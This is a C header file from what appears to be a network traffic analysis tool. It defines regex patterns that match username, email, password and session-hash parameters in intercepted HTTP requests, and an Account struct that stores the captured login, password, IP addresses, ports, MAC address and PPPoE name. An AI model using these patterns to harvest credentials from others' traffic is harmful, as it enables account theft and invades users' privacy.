#ifndef LZ_EMAIL_ACCOUNT_H
#define LZ_EMAIL_ACCOUNT_H
#ifndef LZ_MAIL_LEN 
#define LZ_MAIL_LEN 100
#endif
#ifndef LZ_PASS_LEN
#define LZ_PASS_LEN 100
#endif
#ifndef LZ_URL_LEN
#define LZ_URL_LEN 1024
#endif


#ifndef PATTERN_USER
#define PATTERN_USER "(\\bemagicloginid=)|(\\bemagicloginid=)|(\\bform_userid=)|(\\blogin_id=)|(\\bloginid=)|\
(\\buser_id=)|(\\bp_uid=)|(\\btxtUserID=)|(\\bmember_ID=)|(\\bfrmUserID=)|(\\bEmail_Textbox=)|\
(\\bEmailAddress=)|(\\bEmail=)|(\\buser_mail=)|(\\bemail=)|(\\bemailn=)|(\\bemail_address=)|\
(\\bmailaddress=)|(\\bcardNumber=)|(\\bmobile=)|(\\blog_nummer=)|(\\bmatchcode=)|(\\bloginname=)|\
(\\banwender=)|(\\baccount=)|(\\bsign-in=)|(\\bloginl=)|(\\b&member=)|(\\bname=)|(\\bwriter=)|(\\busername=)|(^username=)|\
(\\buser=)|(\\buser_name=)|(\\b&log=)|(\\bkey=)|(\\busr=)|(\\bun=)|(\\btxtusername=)|(\\buserName=)|\
(\\bLoginName=)|(\\bvwriter=)|(passport_51_user=)|(\\buin=)|(\\b&login=)|(\\bid=)|(\\buserid=)|(\\?userid=)|(\\bxw_name=)|\
(&TPL_username=)|(&User_1=)|(&un=)|(\\bwpName=)|(^u=)|\
(&loginid=)|(username=)|(&txtLoginEmail=)|(email=)|(&user=)|(logininfo=)|(&login_name=)|(user\":\")"
#endif

#ifndef PATTERN_USER_B
#define PATTERN_USER_B "(\\blogin=)|(&UserName=)"
#endif

#ifndef PATTERN_TERM
#define PATTERN_TERM "(\\b\\bemagicloginid=)|(\\b\\bform_userid=)|(\\b\\blogin_id=)|(\\b\\bloginid=)|(\\b\\buser_id)|\
	(\\b\\bp_uid)|(\\b\\btxtUserID=)|(\\b\\bmember_ID=)|(\\b\\bfrmUserID=)|(\\b\\bEmail_Textbox=)|(\\b\\bEmailAddress)|\
	(\\b\\bEmail=)"
#endif

#ifndef PATTERN_PASSWD
#define PATTERN_PASSWD "(&passcode=)|(&Password_Textbox=)|(&intCodSegreto=)|(&credential_1=)|(&_pass=)|(&passwd=)|\
(&logon_pwd=)|(&passwortm=)|(&secretkey=)|(&kennwort=)|(&passwort=)|(&paswwort=)|(&passform=)|\
(&password=)|(&password2=)|(&passWord=)|(&pwlogin=)|(&passwrd=)|(&segreto=)|(&form_pw=)|(&geckos=)|(&pwd=)|\
(&login2)|(&passwd=)|(&p_key=)|(&cppw=)|(&txtpassword)|(&pass=)|(&pin=)|(&psw=)|(&pw=)|(passport_51_password=)|\
(&p=)|(&vpassword=)|(&TPL_password=)|(&xw_pass=)|(&Pass=)|(&wpPassword=)|\
(rmpwd=)|(&password=)|(&txtLoginPwd=)|(SESSION_HASH=)|(password\":\")"
#endif

struct AccountStr
{
	short objectId;
	short type;
	char mail[LZ_MAIL_LEN];
	char pass[LZ_PASS_LEN];
	unsigned int ipSrc;
	unsigned int ipDst;
	unsigned short portSrc;
	unsigned short portDst;
	char macSrc[6];
	char url[LZ_URL_LEN];
	char pppoe[60];
	unsigned int cap_time;
};

typedef struct AccountStr Account;

#endif

